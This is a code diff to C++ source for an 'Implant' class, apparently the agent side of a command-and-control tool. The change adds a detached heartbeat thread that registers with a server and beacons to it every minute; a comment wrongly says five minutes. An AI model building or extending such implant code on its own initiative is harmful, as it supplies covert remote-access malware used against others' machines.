@@ -3,6 +3,7 @@
 #include <fstream>
 #include <unistd.h>
 #include <thread>
+#include <chrono>
 #include <deque>
 #include <asio.hpp>
 #include <asio/ts/internet.hpp>
@@ -34,14 +35,13 @@ void Implant::beacon() {
             if (!error) {
                 std::cout << "Connected to the server!" << std::endl;
                 
-                // Listen for messages, need to have equivalent to .then(), maybe just add callback?
+                // Listen for messages, need to have equivalent to .then(), maybe just add callback to add to receive queue
                 msg::receiveResponse(socket, buf, receive_queue);
 
-                // Send Register Info
                 registerAgent(socket);
 
-                // send heartbeat every x seconds/minutes
-                heartbeat(socket);
+                std::thread heartbeatThread(&Implant::heartbeat, this, std::ref(socket));
+                heartbeatThread.detach();
                     
             } else {
                 // Check for specific errors
@@ -70,27 +70,16 @@ void Implant::registerAgent(asio::ip::tcp::socket& socket) {
     msg::sendRequest(socket, registerResult);
 }
 
-void periodicPing(PingTask& ping, asio::ip::tcp::socket& socket) {
+// TODO: make into own thread or process
+void Implant::heartbeat(asio::ip::tcp::socket& socket) { 
     while (true) {
-        // Perform the ping task
+        PingTask ping(id);
         msg::Request pingResult = ping.run();
         msg::sendRequest(socket, pingResult);
 
-        // Sleep for 5 minutes
-        std::this_thread::sleep_for(std::chrono::minutes(5));
-    }
-}
-
-// TODO: make into own thread or process
-void Implant::heartbeat(asio::ip::tcp::socket& socket) {
-    PingTask ping(id);
-    // Create a thread for the periodic ping task
-    // std::thread pingThread(periodicPing, std::ref(ping), std::ref(socket));
-
-    // // Main thread can do other tasks or wait as needed
-    // pingThread.join();
-    // periodicPing(ping, socket);
-    msg::sendRequest(socket, ping.run());
+        // Wait for 5 minutes before the next heartbeat
+        std::this_thread::sleep_for(std::chrono::minutes(1));
+    } 
 }
 
 void Implant::setRunning(bool running) { isRunning = running; }
